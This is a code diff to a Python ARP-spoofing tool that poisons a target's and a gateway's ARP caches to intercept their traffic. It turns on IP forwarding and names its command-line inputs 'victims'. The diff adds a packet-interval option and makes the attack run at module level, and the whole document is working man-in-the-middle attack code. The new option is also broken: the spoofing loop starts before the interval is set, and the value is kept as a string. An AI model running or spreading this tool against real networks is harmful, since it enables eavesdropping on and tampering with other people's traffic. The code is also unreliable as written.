@@ -10,6 +10,7 @@ def capture_ips():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", dest="target_ip", help="Target machine IP address.")
     parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway or Router IP address.")
+    parser.add_argument("-i", "--time", dest="time_interval", help="Set time interval for packets. Default 0.5s.")
     victims = parser.parse_args()
     if not victims.target_ip or not victims.gateway_ip:
         parser.error("[-] Please specify both a target and a gateway, use --help for info")
@@ -17,12 +18,15 @@ def capture_ips():
 
 
 class ArpSpoof:
-    def __init__(self):
+    def __init__(self, targets):
         os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-        self.targets = capture_ips()
+        self.time_interval = 0.5
+        self.targets = targets
         if self.targets:
             self.target_mac = ""
             self.middle_man(self.targets.target_ip, self.targets.gateway_ip)
+        if self.targets.time_interval:
+            self.time_interval = self.targets.time_interval
 
     def get_mac(self, ip):
         arp_request = scapy.ARP(pdst=ip)
@@ -50,17 +54,19 @@ class ArpSpoof:
         try:
             sent_packets_count = 0
             while True:
-                # victim - router / router - victim
                 self.arp_spoof(target_ip, gateway_ip)
                 self.arp_spoof(gateway_ip, target_ip)
                 sent_packets_count = sent_packets_count + 2
                 print("\r[+] Packets sent: " + str(sent_packets_count))
-                time.sleep(0.5)
+                time.sleep(self.time_interval)
         except KeyboardInterrupt:
-            print("[+] Detected CTRL+C ... Resetting ARP tables now ... please wait.")
+            print("\n\n[+] Detected CTRL+C, resetting ARP tables now.\n\n")
             self.restore(target_ip, gateway_ip)
             self.restore(gateway_ip, target_ip)
 
 
+victims = capture_ips()
+if victims:
+    spoofer = ArpSpoof(victims)
 
 
